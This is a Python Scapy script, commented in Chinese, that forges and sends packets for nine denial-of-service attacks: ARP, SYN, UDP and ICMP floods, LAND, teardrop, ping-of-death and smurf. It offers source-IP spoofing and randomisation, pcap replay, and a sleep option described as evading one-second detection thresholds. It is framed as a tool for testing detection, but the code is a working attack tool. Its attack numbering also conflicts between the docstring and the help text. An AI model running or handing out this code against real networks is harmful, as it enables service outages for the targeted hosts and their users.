
import os.path
from argparse import RawTextHelpFormatter
from enum import Enum, auto
import scapy.all as scapy
import argparse
import sys
import random
import time


class attackType(Enum):
    """攻击类型"""
    arp_flood = auto()
    tcp_land = auto()
    tcp_syn_flood = auto()
    udp_flood = auto()
    udp_tear_drop = auto()
    icmp_flood = auto()
    icmp_unreachable = auto()
    icmp_ping_of_death = auto()
    icmp_smurf = auto()


class DDos_attack(object):
    """
    一个简单的协议栈DDOS攻击辅助工具，借助于Scapy api：https://www.osgeo.cn/scapy/api实现伪造网络包，目前已满足9种网络攻击测试；
        -- 支持命令行方式去配置构造报文以便完成简单的测试
        -- 支持回放本地的pcap报文
        -- 支持已发送攻击数据保存到本地
    """
    """
            9种网络攻击协议：
               arp_flood --> 1秒内收到超过100帧arp报文（不分请求和响应）；
               tcp_land --> TCP的syn报文中源和目的IP地址相同，一帧就报；
               tcp_syn_flood --> 1秒内收到超过100帧TCP的syn报文；
               udp_flood --> 1秒内收到超过1000帧UDP报文
               udp_tear_drop --> IP分片出现重叠，一帧就报
               icmp_flood --> 1秒内收到的icmp报文类型为8的请求帧数超过100帧；
               icmp_unreachable --> 指主机在收到icmp报文类型为3的报文后，会被欺骗，记录目的地信息，对于后续发往此目的地的报文直接认为不可达。
                                       收到任何100帧就认为是攻击
               icmp_ping_of_death --> 指ping包的大小太长。收到ICMP报文中ip头部偏移字段大于50000的报文，1帧就认为是攻击
               icmp_smurf --> 指以攻击目的ip向外发送广播的icmp请求，同一个局域网内收到请求的设备会向攻击目的地发送icmp响应。
                               我们以ICMP响应的个数来判断，1秒内收到超过100帧ICMP 类型为0的echo reply
           """


    def __init__(self,
                 dst_mac="ff:ff:ff:ff:ff:ff",
                 src_mac="7c:8a:e1:98:2a:4b",
                 dst_ip="127.0.0.1",
                 src_ip="127.0.0.1",
                 dst_port=8081,
                 src_port=8081,
                 fragment_offset=0,
                 identification=242,
                 icmpv4_type=0,
                 payload='',
                 flags=0,
                 attack_type=1,
                 debug=0,
                 pcapwrite=0,
                 filename=None,
                 iface=None,
                 srcIpRandom=0,
                 ipsrc=None,
                 ipdst=None,
                 one=0
                 ):
        """
        dst_mac:
            目的主机的mac地址
        src_mac:
            发起主机的mac地址
        dst_ip:
            目的主机的IP地址
        src_ip:
            发起主机的IP地址
        dst_port:
            目的主机的端口（指定tcp,udp)
        src_port:
            发起主机的端口（指定tcp,udp）
        fragment_offset:
            偏移字段，数据分组（用于tcp协议）
        icmpv4_type:
            icmp协议的类型:
                8 --> request
                0 --> reply
                3 --> unreach
        payload:
            应用层的内容（每个数据包都可带上指定的内容）
        TCP flags:
            NULL = 0x00 = 0
            FIN = 0x01 = 1
            SYN = 0x02 = 2
            RST = 0x04 = 4
            PSH = 0x08 = 8
            FIN + PSH = 0x009 = 9
            SYN + PSH = 0x00a = 10
            ACK = 0x010 = 16
            SYN + ACK = 0x12 = 18
            RST + ACK = 0x14 = 20
            PSH + ACK = 0x18 = 24
            SYN + PSH + ACK = 0x01a = 26
        attack_type:
            指定发送的网络攻击协议：
                 1: icmp_flood: 1秒内收到的icmp报文类型为8的请求帧数超过100帧
                 2: icmp_unreachable: icmp报文类型为3的报文，收到任何100帧就认为攻击
                 3: icmp_ping_of_death: 指ping包的大小太长。收到ICMP报文中ip头部偏移字段大于50000的报文，1帧就认为是攻击
                 4: icmp_smurf: 1秒内收到超过100帧ICMP，类型为0的echo reply
                 5: udp_flood: 1秒内收到超过1000帧UDP报文
                 6: udp_tear_drop: IP分片出现重叠，一帧就报
                 7: tcp_syn_flood: 1秒内收到超过100帧TCP的syn报文
                 8: tcp_land: TCP的syn报文中源和目的IP地址相同，一帧就报
                 9: arp_flood: 1秒内收到超过100帧arp报文（不分请求和响应）；
        debug:
            打印输出数据报文的详细信息
            -默认为0，即不打印；为1时打印
        pcapwrite:
            保存已发送数据报文到本地
            -默认为0，即不输出；为1时输出
        filename:
            指定回放pcap文件或路径
        iface:
            指定设配器，即指定网卡发起网络攻击
            -在windows中，适配器有"以太网，以太网 2，以太网 3...."
        srcIpRandom:
            随机生成源IP地址，即attack ip
            -默认为0，默认的ip为10.10.10.10，为1时随机生成一个ip地址
        ipsrc, ipdst:
            随机生成指定的子网的ip地址
            -默认为空，输入格式x.x.x.x/x
        :count:
            指定发送数据包的数量
        """
        self._count = 4
        self.dst_mac = dst_mac
        self.src_mac = src_mac
        self.dst_ip = dst_ip
        self.src_ip = src_ip
        self.dst_port = dst_port
        self.src_port = src_port
        self.fragment_offset = fragment_offset
        self.identification = identification
        self.icmpv4_type = icmpv4_type
        self.payload = payload
        self.flags = flags
        self.iface = iface
        self.attack_type = attack_type
        self.debug = debug
        self.pcapwrite = pcapwrite
        self.filename = filename
        self.srcIprandom = srcIpRandom
        self.ipsrc = ipsrc
        self.ipdst = ipdst
        self.one = one

    @property
    def func(self):
        """返回被调用对象"""
        _attackType = int(self.attack_type) - 1
        _func = list(attackType)[_attackType]
        func_instance = getattr(self, _func.name)
        return func_instance

    def pcapWrite(self, func):
        """保存协议数据报文"""
        file = "%s_n%s.pcap" % (func.__name__,
                                self.count)
        path = './attack_packet'
        if os.path.exists(path) is False:
            os.makedirs(path)
        pktdump = scapy.PcapWriter(os.path.join(path, file),
            append=False,
            sync=True)
        return pktdump

    def rdpcap(self):
        """调用scapy api完成报文回放"""
        return scapy.rdpcap(self.filename)

    def pcapFileIsExists(self):
        """检查回放报文文件是否存在"""
        if self.filename is None:
            return 0
        elif os.path.exists(self.filename) is False:
            raise FileNotFoundError("No such file or directory: '%s'"
                                    % self.filename)
        return 1

    def arp_flood(self):
        """ARP协议"""
        packet = scapy.Ether(src=self.src_mac) / \
                 scapy.ARP(
                     hwsrc=self.src_mac,
                     psrc=self.src_ip,  # who has xxxx ? Tell 'src_ip'
                     hwdst=self.dst_mac,
                     pdst=self.dst_ip  # target
                 )
        return packet

    def tcp_land(self):
        """
        and count > 1
        and flags = 0x02 --> "SYN"
        """
        if self.src_ip == self.dst_ip:
            return self.tcp_syn_flood()
        # self.src_ip, self.src_mac = self.dst_ip, self.dst_mac
        self.src_ip = self.dst_ip
        return self.tcp_syn_flood()

    def tcp_syn_flood(self):
        """count > 100 and flags = 0x02"""
        packet = scapy.Ether(dst=self.dst_mac,
            src=self.src_mac) / \
                 scapy.IP(dst=self.dst_ip,
                     src=self.src_ip,
                     id=self.identification) / \
                 scapy.TCP(sport=self.src_port,
                     dport=self.dst_port,
                     flags=self.flags) / \
                 self.payload
        return packet

    def udp_flood(self):
        """UDP泛洪攻击"""
        # self.dst_port = dr_port()
        packet = scapy.Ether(dst=self.dst_mac) / \
                 scapy.IP(dst=self.dst_ip,
                     src=self.src_ip,
                     id=self.identification) / \
                 scapy.UDP(sport=self.src_port,
                     dport=self.dst_port) / \
                 self.payload
        return packet

    def udp_tear_drop(self):
        """随机生成一个标识"""
        id = identi()

        """设置偏移字段"""
        # offset_1 = 7  # 重叠
        offset_1 = 8  # 正常
        # offset_1 = 9 # 错开

        offset_2 = 15  # 重叠

        """构造payload"""
        load1 = "A" * 56
        load2 = "B" * 56
        load3 = "C" * 56

        """构造数据"""
        packet_1 = scapy.Ether(dst=self.dst_mac) \
                   / scapy.IP(src=self.src_ip, dst=self.dst_ip, id=id, flags='MF', proto=17, frag=0) \
                   / scapy.UDP(sport=8081, dport=6319) \
                   / load1
        packet_2 = scapy.Ether(dst=self.dst_mac) \
                   / scapy.IP(src=self.src_ip, dst=self.dst_ip, id=id, flags="MF", proto=17, frag=offset_1) \
                   / scapy.UDP(sport=8081, dport=6319) \
                   / load2
        packet_3 = scapy.Ether(dst=self.dst_mac) \
                   / scapy.IP(src=self.src_ip, dst=self.dst_ip, id=id, flags=0, proto=17, frag=offset_2) \
                   / scapy.UDP(sport=8081, dport=6319) \
                   / load3

        return list([packet_1, packet_2, packet_3])

    def icmp(self):
        """定义icmp"""
        packet = scapy.Ether() / \
                 scapy.IP(dst=self.dst_ip,
                     src=self.src_ip,
                     frag=self.fragment_offset) / \
                 scapy.ICMP(type=self.icmpv4_type) / \
                 self.payload
        return packet

    def icmp_flood(self):
        self.icmpv4_type = 8
        return self.icmp()

    def icmp_unreachable(self):
        """type = 3 --> unreachable"""
        self.icmpv4_type = 3
        return self.icmp()

    def icmp_ping_of_death(self):
        """fragment offset > 6250 (6250 * 8 = 50000)"""
        self.fragment_offset = 6251
        return self.icmp()

    def icmp_smurf(self):
        """type = 0 --> reply"""
        self.icmpv4_type = 0
        return self.icmp()

    @property
    def count(self):
        return self._count

    @count.setter
    def count(self, value):
        if not isinstance(value, int):
            raise ValueError('value must be an Integer!')
        self._count = value

    def g_time(func):
        # 计时装饰器
        def inner(*arg, **kwarg):
            s_time = time.time()
            res = func(*arg, **kwarg)
            e_time = time.time()
            print('>>>耗时：{:.3f}秒'.format(e_time - s_time))
            return res

        return inner

    def send(self):
        """
        发送 数据包
        """
        packet = self.func
        try:
            _p = packet()
            if self.debug == "1":
                if isinstance(_p, list):
                    for _ in _p:
                        _.show()
            scapy.sendp(_p, iface=self.iface)
        except OSError:
            raise OSError("Realtek PCIe GBE family controller error(请检查使用的网卡是否正确)！")

    @g_time
    def test_protocol(self):
        """
        发送/回放 报文
        """
        packet = self.func
        pktdump = None

        if self.pcapwrite == '1':
            pktdump = self.pcapWrite(packet)

        if self.pcapFileIsExists():
            if self.debug == "1":
                self.rdpcap().show()
            scapy.sendp(self.rdpcap(), iface=self.iface)
            print(">>>回放报文pcap成功!")
        else:

            for _ in range(0, self.count):
                if self.pcapwrite == "1":
                    pktdump.write(packet())
                if self.srcIprandom == "1":
                    self.src_ip = ip_address()
                if self.ipsrc is not None:
                    self.src_ip = ip_random(self.ipsrc)
                if self.ipdst is not None:
                    self.dst_ip = ip_random(self.ipdst)
                """规避1秒检测"""
                if self.one == "1":
                    if _ % 33 == 0:
                        print('>>>sleep 1s')
                        time.sleep(1)
                self.send()

            print(">>>[%s - %s]攻击 - 发送数据包（只发）：%s个" % (
                self.attack_type,
                self.func.__name__,
                self.count
            ))


def ip_random(ipSubnetMask: str) -> str:
    """
    按照子网随机生成一个ip地址
        输入 192.168.1.0/24 , 随机生成一个 192.168.1.0 ~ 192.168.1.255 范围内
        输入 192.168.1.0/30 ,随机生成一个 192.168.1.0 ~ 192.168.1.3 范围内
        输入 192.168.1.252/30 , 随机生成一个 192.168.1.252 ~ 192.168.1.255 范围内
    """
    if not ipSubnetMask.__contains__("/"):
        raise ValueError("Must be is a ip/netmask(x.x.x.x/x) format!")
    network = ipSubnetMask.split("/")
    netmask = int(network.pop())
    _listip = ".".join(network).split(".")
    if len(_listip) != 4:
        raise ValueError("Must be an ip in 32 subnet mask format")

    ipbit = ""  # 保存32bit，即ip转换成32bit
    for bit in _listip:
        try:
            if 0 <= int(bit) <= 255:
                bit = int(bit)
                ipbit += format(bit, '08b')
            else:
                raise ValueError("The input ip format does not match!")
        except ValueError:
            raise TypeError("Must be is an ip type, not string")

    _bit = '0' + str(32 - netmask) + 'b'
    _bitRandomIp = str(format(random.getrandbits(32 - netmask), _bit))  # 随机生成 32 - 子网掩码
    bit32 = ipbit[:netmask] + _bitRandomIp  # x.x.x.x/y --> 固定前（32 - y)位 + 随机y = 32bit

    def bitConvertInt(bit8: str) -> int:
        return int(bit8, 2)

    ip = ".".join(map(str, [bitConvertInt(bit32[:8]),
                            bitConvertInt(bit32[8:16]),
                            bitConvertInt(bit32[16:24]),
                            bitConvertInt(bit32[24:32])]))

    return ip


def ip_address() -> str:
    """
    随机生成一个IP
    """
    addr = [192, 168, 1, 55]
    addr[0] = random.randrange(11, 197)
    addr[1] = random.randrange(0, 255)
    addr[2] = random.randrange(0, 255)
    addr[3] = random.randrange(2, 254)
    address = map(str, [addr[0], addr[1], addr[2], addr[3]])
    return '.'.join(address)


def dr_port() -> int:
    """随机获取一个端口"""
    return random.randint(1001, 65535)


def identi() -> int:
    """随机获取一个 id --> identification"""
    return random.randint(1, 65535)


def tool():
    """
    命令行参数
    """
    attack_type_help = "attack type: \n" \
                       "    1: arp_flood: 1秒内收到超过100帧arp报文（不分请求和响应）\n" \
                       "    2: tcp_land: TCP的syn报文中源和目的IP地址相同，一帧就报\n" \
                       "    3: tcp_syn_flood: 1秒内收到超过100帧TCP的syn报文\n" \
                       "    4: udp_flood: 1秒内收到超过1000帧UDP报文\n" \
                       "    5: udp_tear_drop: IP分片出现重叠，一帧就报\n" \
                       "    6: icmp_flood: 1秒内收到的icmp报文类型为8的请求帧数超过100帧\n" \
                       "    7: icmp_unreachable: icmp报文类型为3的报文，收到任何100帧就认为攻击\n" \
                       "    8: icmp_ping_of_death: 指ping包的大小太长。收到ICMP报文中ip头部偏移字段大于50000的报文，1帧就认为是攻击\n" \
                       "    9: icmp_smurf: 1秒内收到超过100帧ICMP，类型为0的echo reply\n" \

    if len(sys.argv) == 1:
        sys.argv.append('--help')

    parser = argparse.ArgumentParser(description='9种网络攻击协议测试', formatter_class=RawTextHelpFormatter)

    parser.add_argument('-t', '--attackType', type=int, default=1, help=attack_type_help)
    parser.add_argument('-n', '--count', type=int, default=4, help='输入发送报文的数量, (default:4)')
    parser.add_argument('-d', '--dst_ip', type=str, default='19.19.19.19', help='destination address, '
                                                                                '(default:19.19.19.19)')
    parser.add_argument('-s', '--src_ip', type=str, default='19.19.19.11', help='source address, (default:19.19.19.11)')
    parser.add_argument('-D', '--dst_mac', type=str, default='0c:73:eb:9c:26:a0', help='destination mac, '
                                                                                       '(default:0c:73:eb:9c:26:a0)')
    parser.add_argument('-S', '--src_mac', type=str, default='7C:8A:E1:98:2A:4B', help='source mac, '
                                                                                       '(default:7C:8A:E1:98:2A:4B)')
    parser.add_argument('-sport', type=int, default=8081, help='输入源地址端口,(default:8081)')
    parser.add_argument('-dport', type=int, default=8081, help='输入目的地址端口,(default:8081)')
    parser.add_argument('-f', '--flags', type=int, default=2, help='输入tcp的flags, default:2(syn)')
    parser.add_argument('--debug', type=str, default=0, help='当为1时，详细输出发送的每一帧报文, (default 0)')
    parser.add_argument('-i', '--iface', type=str, default='以太网', help='以特定的适配器(网卡)发送数据报文, (default:以太网)')
    parser.add_argument('--pcapwrite', type=str, default=0, help='当为1时，输出pcap文件到当前目录,(default 0)')
    parser.add_argument('--filename', dest='filename', type=str, default=None, help='回放指定路径的pcap文件, '
                                                                                    '例如: "./xxx.pcap", (default: 无)')
    parser.add_argument('--srcIpRandom', type=str, default=0, help='当为1时，随机生成源IP地址,(default 0)')
    parser.add_argument('--ipsrc', type=str, default=None, help='输入"10.10.10.0/24"随机返回10.10.10.x格式的ip作为源ip(default 无)')
    parser.add_argument('--ipdst', type=str, default=None, help='输入"10.10.10.0/24"随机返回10.10.10.x格式的ip作为源ip(default 无)')
    parser.add_argument('--one', type=str, default=0, help='当为1时,每发100帧将休眠1s(default 0)')

    arguments = parser.parse_args()
    return arguments


def main():
    """主程序"""
    arguments = tool()
    attack_type = arguments.attackType
    dst_ip = arguments.dst_ip
    src_ip = arguments.src_ip
    dst_mac = arguments.dst_mac
    flags = arguments.flags
    debug = arguments.debug
    iface = arguments.iface
    pcapwrite = arguments.pcapwrite
    filename = arguments.filename
    sport = arguments.sport
    dport = arguments.dport
    srcIpRandom = arguments.srcIpRandom
    ipsrc = arguments.ipsrc
    ipdst = arguments.ipdst
    one = arguments.one
    ddos = DDos_attack(dst_mac=dst_mac,
        src_ip=src_ip,
        dst_ip=dst_ip,
        attack_type=attack_type,
        src_port=sport,
        dst_port=dport,
        payload='ddos attack testing',
        debug=debug,
        flags=flags,
        iface=iface,
        pcapwrite=pcapwrite,
        filename=filename,
        srcIpRandom=srcIpRandom,
        ipsrc=ipsrc,
        ipdst=ipdst,
        one=one)
    ddos.count = arguments.count

    ddos.test_protocol()


if __name__ == '__main__':
    main()
